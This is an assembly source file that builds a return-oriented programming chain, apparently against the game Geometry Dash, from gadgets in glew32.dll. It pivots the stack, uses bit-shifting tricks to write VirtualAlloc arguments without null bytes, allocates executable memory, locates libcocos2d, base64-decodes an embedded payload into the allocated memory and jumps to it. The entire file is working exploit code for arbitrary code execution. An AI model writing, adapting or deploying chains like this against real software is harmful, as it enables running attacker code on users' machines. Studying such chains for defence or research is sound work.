BITS 32

; glew32.dll base address
%define G 0x62aa0000
%define DONTCARE 0x11111111

%ifndef POST_GMH
%ifndef POST_B64

; edi = add esp, 8
; ebx = eax = PlayLayer*

dd G + 0x2010 ; ebp (random readable address)

; ==== since this is the stack now, we need to make sure there's enough space for
; windows functions, otherwise they will overflow and corrupt the heap

; 8mb (2*dword) should be good

times 2000000 dd G + 0x1006 ; ret

; dd G + 0x18bc3 ; pop eax

; dd G + 0x180ce ; mov dword ptr [esp + 0x34], eax; call edi; [noret]
; dd DONTCARE

; add 0x22c+0x37 to eax
times ((0x22c + 0x37) / 8) dd G + 0x18bdb ; add eax, 8
times ((0x22c + 0x37) % 8) dd G + 0x19248 ; add eax, 1

dd G + 0x1229 ; pop ebx
dd -8

; set ebx = [eax-0x37] - 8
dd G + 0x18215 ; add ebx, dword ptr [eax - 0x37]

; store esi for later
dd G + 0x1748b ; mov eax, esi; pop esi
dd DONTCARE
dd G + 0x18ecf ; mov dword ptr [0x62aeb5fc], eax

dd G + 0x16426 ; pop ecx
dd G + 0xcc48 ; add esp, 8

; reset edx
dd G + 0x1b1e0 ; xor edx, edx; xor esi, esi; xor edi, edi; call ecx;
dd DONTCARE

; set edx=ebx
dd G + 0x1d01e ; add edx, ebx; pop ebx; ret 0x10
dd -8 ; ebx
dd G + 0x18e6a ; mov eax, edx
dd DONTCARE
dd DONTCARE
dd DONTCARE
dd DONTCARE

; add 0x118+8+0x37 to eax
times ((0x118 + 8 + 0x37) / 8) dd G + 0x18bdb ; add eax, 8
times ((0x118 + 8 + 0x37) % 8) dd G + 0x19248 ; add eax, 1

; set ebx = [eax-0x37] - 8
dd G + 0x18215 ; add ebx, dword ptr [eax - 0x37]

; reset edx
dd G + 0x1b1e0 ; xor edx, edx; xor esi, esi; xor edi, edi; call ecx;
dd DONTCARE

; set edx=ebx
dd G + 0x1d01e ; add edx, ebx; pop ebx; ret 0x10
dd -8 ; ebx
dd G + 0x18e6a ; mov eax, edx
dd DONTCARE
dd DONTCARE
dd DONTCARE
dd DONTCARE

; ----- set addr ----

dd G + 0x16426 ; pop ecx
dd -(virtualalloc_addr+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x80808080 ; the 128s bit must be set and nothing else in the LSB, others dont matter

; this is equivalent to a left shift by 1
times 25 dd G + 0x17f85 ; add ecx, ecx

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set type low bits ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(virtualalloc_type+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x01010180

times 5 dd G + 0x17f85 ; add ecx, ecx

; ecx = 0x20203000

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set type high bits and prot low bits ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(virtualalloc_type+2+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x80808080

times 15 dd G + 0x17f85 ; add ecx, ecx

; ecx = 0x20203000

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set prot high bits ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(virtualalloc_prot+1+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x80808080

times 17 dd G + 0x17f85 ; add ecx, ecx

; ecx = 0

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set b64 inlen MSBs ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(b64decode_inlen+PAYLOAD_B64_BYTES+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x16426 ; pop ecx
dd 0x80808080

times 25 dd G + 0x17f85 ; add ecx, ecx

; ecx = 0

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set gmh name ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(cocos+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x1cfdd ; mov ecx, eax; mov eax, esi; pop esi; ret 0x10
dd DONTCARE ; esi
dd G + 0x18e6a ; mov eax, edx
dd DONTCARE
dd DONTCARE
dd DONTCARE
dd DONTCARE

dd G + 0x177bd ; pop edi
dd G + 0xcc48 ; add esp, 8

%ifndef PRE
; thanks z3
times GMH_B4 dd G + 0x19441 ; add eax, 0xb4; push eax; call edi; [noret]
times GMH_8 dd G + 0x18bdb ; add eax, 8
times GMH_1 dd G + 0x19248 ; add eax, 1
%endif

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

; ----- set b64 input name ----

dd G + 0x18e6a ; mov eax, edx

dd G + 0x16426 ; pop ecx
dd -(payload+8)
dd G + 0x1acea ; sub eax, ecx

dd G + 0x1cfdd ; mov ecx, eax; mov eax, esi; pop esi; ret 0x10
dd DONTCARE ; esi
dd G + 0x18e6a ; mov eax, edx
dd DONTCARE
dd DONTCARE
dd DONTCARE
dd DONTCARE

%ifndef PRE
; thanks z3
times B64_B4 dd G + 0x19441 ; add eax, 0xb4; push eax; call edi; [noret]
times B64_8 dd G + 0x18bdb ; add eax, 8
times B64_1 dd G + 0x19248 ; add eax, 1
times NOP dd G + 0x1006 ; ret
%endif

dd G + 0x1711d ; mov dword ptr [eax], ecx; xor eax, eax; pop esi
dd DONTCARE ; esi

%endif
%endif

%ifndef PRE
; ----- call virtualalloc ----

dd G + 0x18bc3 ; pop eax
dd G + 0x1e0c8 ; &VirtualAlloc
dd G + 0xf0dd ; jmp dword ptr [eax]
; copy to return address
dd G + 0x180ce ; ret, mov dword ptr [esp + 0x34], eax; call edi; [noret]
virtualalloc_addr: dd DONTCARE ; addr
dd 0x01010101 ; size
virtualalloc_type: dd DONTCARE ; type
virtualalloc_prot: dd DONTCARE ; prot 

; eax = allocated block, now we need to decode base64 into it

dd DONTCARE ; 0
dd G + 0x1006 ; 4, ret (nop)

; copy to output
dd G + 0x180ce ; mov dword ptr [esp + 0x34], eax; call edi; [noret]
dd DONTCARE ; 0
dd G + 0x1006 ; 4, ret (nop)
dd G + 0x18bc3 ; 8, pop eax
dd G + 0x1e020 ; c, &GetModuleHandleA
dd G + 0xf0dd ; 10, jmp dword ptr [eax]
dd G + 0x16426 ; 14, ret, pop ecx
%ifndef POST_GMH
gmh_name: dd DONTCARE ; 18, modulename

dd -0xd9a10 ; 1c
dd G + 0x1acea ; 20, sub eax, ecx

dd G + 0x18b94 ; 24, jmp eax
dd DONTCARE ; 28, return
%ifndef POST_B64
b64decode_input: dd DONTCARE ; 2c, input
b64decode_inlen: dd PAYLOAD_B64_LEN ; 30, input length
dd DONTCARE ; 34, output
dd G + 0x48034 ; output length (out pointer)
dd 0x01010101 ; urlsafe (nonzero = true)

payload:
incbin "../build/payload_b64.txt"

ALIGN 256 ; fixes possible null byte at line 163

cocos: db "libcocos2d" ; null byte inserted as terminator
%endif
%endif
%endif
%ifdef PRE
virtualalloc_addr:
virtualalloc_type:
virtualalloc_prot:
b64decode_inlen:
payload:
cocos:
%endif
